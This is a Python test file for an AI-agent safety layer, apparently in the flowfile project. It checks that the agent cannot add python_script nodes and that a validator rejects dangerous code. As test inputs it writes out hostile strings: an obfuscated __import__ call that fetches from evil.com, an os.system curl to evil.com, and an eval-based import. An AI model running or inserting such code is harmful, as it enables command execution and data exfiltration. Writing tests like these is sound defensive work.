"""Tests for blocking python_script from AI agent (TODO 1).

Covers:
- ``python_script`` is in ``AGENT_BLOCKED_NODE_TYPES`` (blocked at add time)
- ``python_script_validation`` is a valid ``RefusalReason``
- AST validator rejects ``__import__("re"+"quests")`` in python_script code
"""

from __future__ import annotations

from typing import get_args

from flowfile_core.ai.safety import AGENT_BLOCKED_NODE_TYPES, RefusalReason
from flowfile_core.ai.tools.executor.handlers.add import _validate_python_script_body_or_reject


class TestPythonScriptBlocked:
    """Verify python_script is blocked from AI agent access."""

    def test_python_script_in_blocked_node_types(self) -> None:
        assert "python_script" in AGENT_BLOCKED_NODE_TYPES

    def test_python_script_validation_in_refusal_reason(self) -> None:
        assert "python_script_validation" in get_args(RefusalReason)

    def test_dunder_import_concat_refused(self) -> None:
        """``__import__("re"+"quests")`` must be refused."""
        result = _validate_python_script_body_or_reject(
            node_type="python_script",
            code='__import__("re"+"quests").get("http://evil.com")',
            tool_name="flowfile.graph.update_node_settings",
            redacted_args={},
            session_id="test",
            user_id=1,
            flow_id=1,
        )
        assert result is not None
        assert result.status == "rejected"
        assert result.refusal_reason == "python_script_validation"

    def test_import_statement_refused(self) -> None:
        """``import os`` must be refused."""
        result = _validate_python_script_body_or_reject(
            node_type="python_script",
            code="import os\nos.system('curl evil.com')",
            tool_name="flowfile.graph.update_node_settings",
            redacted_args={},
            session_id="test",
            user_id=1,
            flow_id=1,
        )
        assert result is not None
        assert result.status == "rejected"

    def test_eval_exec_refused(self) -> None:
        result = _validate_python_script_body_or_reject(
            node_type="python_script",
            code="eval('__import__(\"os\")')",
            tool_name="flowfile.graph.update_node_settings",
            redacted_args={},
            session_id="test",
            user_id=1,
            flow_id=1,
        )
        assert result is not None
        assert result.status == "rejected"

    def test_clean_code_passes(self) -> None:
        result = _validate_python_script_body_or_reject(
            node_type="python_script",
            code="x = 1 + 2\nresult = x * 3",
            tool_name="flowfile.graph.update_node_settings",
            redacted_args={},
            session_id="test",
            user_id=1,
            flow_id=1,
        )
        assert result is None

    def test_non_python_script_skipped(self) -> None:
        """Validator returns None for non-python_script node types."""
        result = _validate_python_script_body_or_reject(
            node_type="filter",
            code="__import__('os')",
            tool_name="flowfile.graph.update_node_settings",
            redacted_args={},
            session_id="test",
            user_id=1,
            flow_id=1,
        )
        assert result is None
